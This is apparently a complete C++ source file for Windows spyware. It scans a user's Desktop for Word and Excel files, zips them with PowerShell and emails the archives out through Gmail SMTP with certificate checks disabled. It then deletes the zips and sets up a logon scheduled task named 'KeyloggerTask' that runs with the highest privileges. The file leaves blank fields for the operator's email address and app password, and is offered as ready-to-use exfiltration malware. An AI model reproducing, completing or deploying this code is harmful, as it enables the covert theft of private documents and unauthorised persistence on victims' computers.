#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include <cstdlib>
#include <curl/curl.h>
#include "sendmail.h"
#pragma comment(lib, "libcurl-x64.lib")
using namespace std;
namespace fs = filesystem;

// Config
constexpr uintmax_t MAX_FILE_SIZE = 24990000;
const string MAIL_ADDRESS = ""; // add your mail
const string MAIL_SUBJECT = "File Attachment Retrieval";
const string APP_PASSWORD = ""; // add your app password

// Structs
struct FileEntry {
    string path;
    uintmax_t size;
};

void log(const string& msg) {
    ofstream f("C:\\Users\\anhbq16\\Desktop\\log.txt", ios::app);
    f << msg << endl;
}

wstring getExePath() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    return exePath;
}

// ===Schedule Task===
void sendMailTask() {
    wstring exePath = getExePath();
    string path(exePath.begin(), exePath.end());
    string taskName = "KeyloggerTask";
    string cmd = "schtasks /Create /SC ONLOGON /RL HIGHEST /TN \"" + taskName + "\" /TR \"\\\"" + path + "\\\" /keylogger\" /F /IT";
    system(cmd.c_str());
}

vector<FileEntry> findDocs(const string& root) {
    log("[+] Bat dau quet file: ");
    vector<FileEntry> files;
    for (const auto& entry : fs::recursive_directory_iterator(root, fs::directory_options::skip_permission_denied)) {
        if (entry.is_regular_file()) {
            string ext = entry.path().extension().string();
            if ((ext == ".docx" || ext == ".xlsx")) {
                files.push_back({ entry.path().string(), entry.file_size() });
            }
        }
    }
    return files;
}

vector<vector<FileEntry>> sliceFiles(const vector<FileEntry>& files) {
    vector<vector<FileEntry>> slices;
    vector<FileEntry> current;
    uintmax_t size = 0;
    for (const auto& f : files) {
        if (size + f.size > MAX_FILE_SIZE && !current.empty()) {
            slices.push_back(current);
            current.clear();
            size = 0;
        }
        current.push_back(f);
        size += f.size;
    }
    if (!current.empty()) slices.push_back(current);
    return slices;
}

bool file_exists(const string& name) {
    return fs::exists(name);
}

void zipFiles(const std::vector<FileEntry>& files, const std::string& zipName) {
    std::string fileList;
    
    for (const auto& file : files) {
        log("   - " + file.path);
        fileList += "\"" + file.path + "\",";
    }
    if (!fileList.empty()) fileList.pop_back();
    std::string cmd = "powershell.exe Compress-Archive -Path " + fileList + " -DestinationPath \"" + zipName + "\" -Force";
    int ret = system(cmd.c_str());
    log("[+] Compress-Archive return code: " + std::to_string(ret));
}


void sendZip(const string& zipPath) {
    CURL* curl = curl_easy_init();
    if (!curl) {
        log("[-] curl_easy_init() failed!");
        return;
    }

    struct curl_slist* recipients = NULL;
    struct curl_slist* headers = NULL;

    // SMTP & Auth
    curl_easy_setopt(curl, CURLOPT_USERNAME, MAIL_ADDRESS.c_str());
    curl_easy_setopt(curl, CURLOPT_PASSWORD, APP_PASSWORD.c_str());
    curl_easy_setopt(curl, CURLOPT_URL, "smtps://smtp.gmail.com:465");
    curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);

    
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    // Header
    string from = "From: <" + MAIL_ADDRESS + ">";
    string to = "To: <" + MAIL_ADDRESS + ">";
    string subject = "Subject: " + MAIL_SUBJECT;

    headers = curl_slist_append(headers, from.c_str());
    headers = curl_slist_append(headers, to.c_str());
    headers = curl_slist_append(headers, subject.c_str());

    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    // SMTP envelope
    curl_easy_setopt(curl, CURLOPT_MAIL_FROM, ("<" + MAIL_ADDRESS + ">").c_str());
    recipients = curl_slist_append(recipients, ("<" + MAIL_ADDRESS + ">").c_str());
    curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

    // MIME
    curl_mime* mime = curl_mime_init(curl);

    // Part 1: body text
    curl_mimepart* part = curl_mime_addpart(mime);
    curl_mime_data(part, "Attached zip file.", CURL_ZERO_TERMINATED);
    curl_mime_type(part, "text/plain; charset=utf-8");

    // Part 2: attachment
    part = curl_mime_addpart(mime);
    curl_mime_filedata(part, zipPath.c_str());
    curl_mime_type(part, "application/zip");
    curl_mime_filename(part, fs::path(zipPath).filename().string().c_str());
    curl_mime_encoder(part, "base64"); 

    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

    // Gửi mail
    CURLcode res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        log(string("[-] curl_easy_perform() failed: ") + curl_easy_strerror(res));
    }
    else {
        log("[+] Email sent successfully!");
    }

    curl_slist_free_all(recipients);
    curl_slist_free_all(headers);
    curl_mime_free(mime);
    curl_easy_cleanup(curl);
}


void sendmail() {
    string scan_dir = "C:\\Users\\anhbq16\\Desktop";
    auto files = findDocs(scan_dir);
    if (files.empty()) {
        cout << "No files found." << endl;
        return;
    }
    auto slices = sliceFiles(files);
    int idx = 0;
    for (const auto& slice : slices) {
        string zipName = scan_dir + "\\docs_" + to_string(idx++) + ".zip";
        zipFiles(slice, zipName);
        if(!file_exists(zipName)){
            cerr << "[-] Khong zip duoc file" << zipName << endl;
            continue;
        }
        sendZip(zipName);
        fs::remove(zipName);
    }
    log("[+] gui mail thanh cong");
}
